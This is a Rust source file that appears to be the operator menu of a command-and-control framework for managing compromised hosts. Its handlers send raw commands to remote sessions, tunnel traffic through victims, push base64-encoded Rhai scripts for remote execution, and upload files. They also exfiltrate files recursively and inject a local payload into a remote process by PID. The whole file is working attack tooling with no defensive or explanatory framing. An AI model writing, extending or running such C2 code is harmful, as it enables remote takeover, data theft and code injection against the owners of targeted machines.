// ./src/menu/handlers.rs
use crate::common::{SharedSessions, Session};
use crate::file_transfer;
use crate::menu::{ui, proxy};
use std::fs;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use std::path::Path;

pub fn handle_global(
    line: &str, 
    sessions: &SharedSessions, 
    current_session_id: &mut Option<u32>
) {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.is_empty() { return; }

    match parts[0] {
        "help" => ui::print_help(),
        "sessions" => ui::print_sessions(sessions),
        "interact" => {
            if parts.len() < 2 { 
                eprintln!("Usage: interact <id>"); 
            } else if let Ok(tid) = parts[1].parse::<u32>() {
                let map = sessions.lock().unwrap();
                if map.contains_key(&tid) {
                    *current_session_id = Some(tid);
                    eprintln!("[+] Interacting with Session {}.", tid);
                } else { 
                    eprintln!("[-] ID not found."); 
                }
            }
        },
        "exit" | "quit" => std::process::exit(0),
        _ => eprintln!("Unknown command."),
    }
}

pub fn handle_session(
    line: &str, 
    session_id: u32,
    sessions: &SharedSessions,
    proxy_map: proxy::ProxyMap
) {
    // Re-acquire session lock to send command
    let map = sessions.lock().unwrap();
    let session = match map.get(&session_id) {
        Some(s) => s,
        None => {
            eprintln!("[-] Session {} lost.", session_id);
            return;
        }
    };

    if line == "proxy start" {
        proxy::start(session_id, proxy_map, session.tx.clone());
    } 
    else if line == "proxy stop" {
        proxy::stop(session_id, proxy_map, session.tx.clone());
    } 
    else if line == "extension list" {
        ui::print_extensions();
    }
    else if line.starts_with("extension load ") {
        handle_extension_load(line, session);
    }
    else if line.starts_with("upload ") {
        handle_upload(line, session);
    }
    else if line.starts_with("download ") {
        handle_download(line, session);
    }
    else if line.starts_with("inject ") {
        handle_inject(line, session);
    }
    else {
        // Raw command
        let _ = session.tx.send((line.to_string(), None));
    }
}

fn handle_extension_load(line: &str, session: &Session) {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.len() >= 3 {
        let ext_name = parts[2];
        let raw_args: Vec<&str> = parts.iter().skip(3).cloned().collect();
        let path = format!("./extensions/{}.rhai", ext_name);
        
        // 1. Read the Rhai script
        let script_content = match fs::read_to_string(&path) {
            Ok(c) => c,
            Err(_) => {
                eprintln!("[-] Failed to read extension script: {}", path);
                return;
            }
        };
        let b64_script = BASE64.encode(script_content);

        // 2. Process Arguments (Auto-detect files)
        // If an argument exists as a file on disk, read it and B64 encode it.
        // Otherwise, pass it as a literal string.
        let mut processed_args = Vec::new();
        
        for arg in raw_args {
            let p = Path::new(arg);
            if p.exists() && p.is_file() {
                // It's a file! Read and encode.
                match fs::read(p) {
                    Ok(bytes) => {
                        eprintln!("[*] Argument '{}' detected as file. Sending content ({} bytes)...", arg, bytes.len());
                        processed_args.push(BASE64.encode(bytes));
                    },
                    Err(e) => {
                        eprintln!("[-] Failed to read argument file '{}': {}", arg, e);
                        return;
                    }
                }
            } else {
                // Not a file, pass literal
                processed_args.push(arg.to_string());
            }
        }

        // 3. Construct Command
        let mut cmd = format!("ext:load {}", b64_script);
        for arg in processed_args {
            cmd.push(' ');
            cmd.push_str(&arg);
        }

        let _ = session.tx.send((cmd, None));
        eprintln!("[+] Extension '{}' sent.", ext_name);

    } else {
        eprintln!("Usage: extension load <name> [args...]");
    }
}

fn handle_upload(line: &str, session: &Session) {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.len() == 3 {
        match file_transfer::read_file_to_b64(parts[1]) {
            Ok((b64, _)) => {
                let cmd = format!("file:write|{}|{}", parts[2], b64);
                let _ = session.tx.send((cmd, None));
                eprintln!("[+] Uploading {} bytes...", b64.len());
            },
            Err(e) => eprintln!("[-] File Error: {}", e),
        }
    } else { eprintln!("Usage: upload <local> <remote>"); }
}

fn handle_download(line: &str, session: &Session) {
    let args: Vec<&str> = line.split_whitespace().collect();
    let recursive = args.contains(&"-r");
    let path_opt = args.iter().find(|&&x| x != "download" && x != "-r");
    
    if let Some(path) = path_opt {
        if recursive {
            eprintln!("[*] RECURSIVE download '{}'...", path);
            let _ = session.tx.send((format!("file:read_recursive|{}", path), None));
        } else {
            eprintln!("[*] Downloading '{}'...", path);
            let _ = session.tx.send((format!("file:read|{}", path), None));
        }
    } else { eprintln!("Usage: download [-r] <remote_path>"); }
}

fn handle_inject(line: &str, session: &Session) {
    let parts: Vec<&str> = line.split_whitespace().collect();
    
    if parts.len() != 3 {
        eprintln!("Usage: inject <pid> <local_file_path>");
        return;
    }

    let pid = parts[1];
    let local_path = parts[2];

    match fs::read(local_path) {
        Ok(buffer) => {
            let b64_payload = BASE64.encode(buffer);
            let cmd = format!("proc:inject {} {}", pid, b64_payload);
            let _ = session.tx.send((cmd, None));
            eprintln!("[+] Sending injection payload ({} bytes) for PID {}...", b64_payload.len(), pid);
        },
        Err(e) => eprintln!("[-] Failed to read local file '{}': {}", local_path, e),
    }
}
